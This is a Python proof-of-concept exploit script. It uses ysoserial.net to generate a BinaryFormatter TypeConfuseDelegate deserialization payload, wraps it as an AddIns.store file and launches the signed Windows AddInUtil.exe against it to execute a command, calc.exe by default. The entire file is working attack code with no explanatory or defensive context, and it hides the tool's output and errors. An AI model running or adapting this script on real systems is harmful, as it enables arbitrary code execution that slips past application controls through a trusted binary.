import os
import shutil
import subprocess
import sys

YSOSERIAL  = r"C:\path\to\ysoserial.net\ysoserial\bin\Release\ysoserial.exe"
ADDINUTIL  = r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\AddInUtil.exe"
EXPLOIT_DIR = r"C:\Temp\AddinExploit"
COMMAND     = "calc.exe"

def prepare_dir(path):
    if os.path.exists(path):
        shutil.rmtree(path)
    os.makedirs(path)

def gen_payload(ys_path, cmd):
    proc = subprocess.Popen(
        [ys_path,
         "-f", "BinaryFormatter",
         "-g", "TypeConfuseDelegate",
         "-c", cmd,
         "-o", "raw"],
        stdout=subprocess.PIPE
    )
    raw, _ = proc.communicate()
    if proc.returncode != 0 or not raw:
        sys.exit(1)
    return raw

def write_store(raw_bytes, out_dir):
    raw_path   = os.path.join(out_dir, "AddIns.store.raw")
    store_path = os.path.join(out_dir, "AddIns.store")
    with open(raw_path,   "wb") as f: f.write(raw_bytes)
    with open(store_path, "wb") as f:
        f.write(b"\x00" * 12 + raw_bytes)
    return store_path

def run_addinutil(addinutil_path, store_dir):
    subprocess.run(
        [addinutil_path, f"-AddinRoot:{store_dir}"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        check=False
    )

def main():
    prepare_dir(EXPLOIT_DIR)
    raw = gen_payload(YSOSERIAL, COMMAND)
    write_store(raw, EXPLOIT_DIR)
    run_addinutil(ADDINUTIL, EXPLOIT_DIR)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        sys.exit(1)
    sys.exit(0)
